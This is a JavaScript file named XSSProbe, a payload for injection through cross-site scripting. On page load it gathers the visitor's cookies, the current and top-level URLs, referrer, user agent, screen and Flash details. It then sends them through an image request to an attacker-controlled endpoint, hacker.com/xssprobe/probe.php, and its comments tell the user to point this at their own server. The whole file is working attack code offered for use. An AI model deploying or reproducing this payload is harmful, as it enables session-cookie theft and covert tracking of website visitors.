/*******************************************************************************
 *
 *  XSSProbe - A client-side information gathering tool.
 *  Author: evilcos@gmail.com | @xeyeteam
 *  Version: 1.0
 *  License: MIT (or similar, not specified in original)
 *
 *  This script collects various client-side browser and system information
 *  and transmits it to a specified server-side endpoint.
 *
 ******************************************************************************/

//  Define the target server endpoint for exfiltrating collected private information.
//  This URL should point to your 'probe.php' script or similar data collection service.
//  It's crucial to configure this with your own server's address.
http_server = "http://www.hacker.com/xssprobe/probe.php?c=";




var info = {}; // Initialize an empty JavaScript object to store all collected privacy-related details.

/*
 *  Function to detect and return browser name and version.
 *  It parses the User-Agent string using regular expressions.
 */
info.browser = function ( )
{
    // Convert the User-Agent string to lowercase for easier regex matching.
    ua = navigator.userAgent.toLowerCase();

    // Regular expressions for common browser engines.
    var rwebkit = /(webkit)[ \/]([\w.]+)/;
    var ropera  = /(opera)(?:.*version)?[ \/]([\w.]+)/;
    var rmsie   = /(msie) ([\w.]+)/;
    var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;

    // Attempt to match the User-Agent against known browser patterns.
    var match   = rwebkit.exec( ua )          ||
                  ropera.exec( ua )            ||
                  rmsie.exec( ua )             ||
                  ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
                  []; // Default to an empty array if no match is found.

    // Return an object containing the detected browser name and version.
    // Default to empty string for name and "0" for version if not found.
    return { name: match[1] || "", version: match[2] || "0" };
}(); // Immediately invoke this function to assign its return value to info.browser.



// Store the full User-Agent string, escaped for URL transmission.
info.ua = escape( navigator.userAgent );

// Record the browser's language setting.
info.lang = navigator.language;

// Capture the referrer URL, if any, also escaped.
info.referrer = escape( document.referrer );

// Get the current window's URL, escaped.
info.location = escape( window.location.href );

// Get the top-level window's URL, escaped. Useful in iframes.
info.toplocation = escape( top.location.href );

// Retrieve all cookies for the current domain, escaped.
info.cookie = escape( document.cookie );

// Get the current document's domain.
info.domain = document.domain;

// Fetch the title of the current document.
info.title = document.title;


/*
 *  Function to determine the screen resolution.
 */
info.screen = function ( )
{
    var c = ""; // Initialize an empty string for screen resolution.

    // Check if the 'screen' object is available in the self context.
    if ( self.screen )
    {
        // Concatenate width and height if screen object exists.
        c = screen.width + "x" + screen.height;
    }

    return c; // Return the resolution string.
}(); // Immediately invoke this function.


/*
 *  Function to detect the installed Flash Player version.
 *  Supports both plugin-based (Netscape-style) and ActiveX (IE) detection.
 */
info.flash = function ( )
{
    var f = "", n = navigator; // Initialize flash version string and cache navigator object.

    // Check for Netscape-style plugins (Firefox, Chrome, etc.).
    if ( n.plugins && n.plugins.length )
    {
        // Iterate through all available plugins.
        for ( var ii = 0; ii < n.plugins.length; ii++ )
        {
            // Look for a plugin whose name includes 'Shockwave Flash'.
            if ( n.plugins[ii].name.indexOf( 'Shockwave Flash' ) != -1 )
            {
                // Extract the version number from the description string.
                f = n.plugins[ii].description.split( 'Shockwave Flash ' )[1];
                break; // Found it, no need to continue.
            }
        }
    }
    // Else, check for ActiveX objects (Internet Explorer).
    else if ( window.ActiveXObject )
    {
        // Try to create ActiveXObject from version 20 down to 2.
        for ( var ii = 20; ii >= 2; ii-- )
        {
            try
            {
                // Attempt to instantiate the ShockwaveFlash ActiveX object.
                var fl = eval( "new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + ii + "');" );
                if ( fl )
                {
                    f = ii + '.0'; // Set the version and break.
                    break;
                }
            }
            catch ( e )
            {
                // Ignore errors; this version might not be installed.
            }
        }
    }
    return f; // Return the detected Flash version.
}(); // Immediately invoke this function.


// Utility function to convert a JavaScript object into a JSON-like string.
// This is a simple implementation and does not handle nested objects/arrays rigorously
// or complex data types beyond basic strings and numbers.
function json2str( o )
{
    var arr = []; // Array to hold key-value pairs as strings.

    // Helper function to format values.
    var fmt = function ( s )
    {
        // If the value is an object (and not null), recursively convert it.
        if ( typeof s == 'object' && s != null )
        {
            return json2str( s );
        }
        // If it's a string or number, wrap strings in single quotes.
        return /^(string|number)$/.test( typeof s ) ? "'" + s + "'" : s;
    };

    // Iterate over properties of the input object.
    for ( var i in o )
    {
        // Push formatted key-value pair into the array.
        arr.push( "'" + i + "':" + fmt( o[i] ) );
    }

    // Join the pairs with commas and wrap in curly braces to form an object string.
    return '{' + arr.join( ',' ) + '}';
}


// This code block executes once the entire page has loaded.
window.onload = function ( )
{
    // Convert the collected 'info' object into a URL-friendly string.
    var i = json2str( info );

    // Create a new Image object and set its source to the http_server endpoint
    // concatenated with the collected information. This sends the data via a GET request.
    new Image( ).src = http_server + i;
};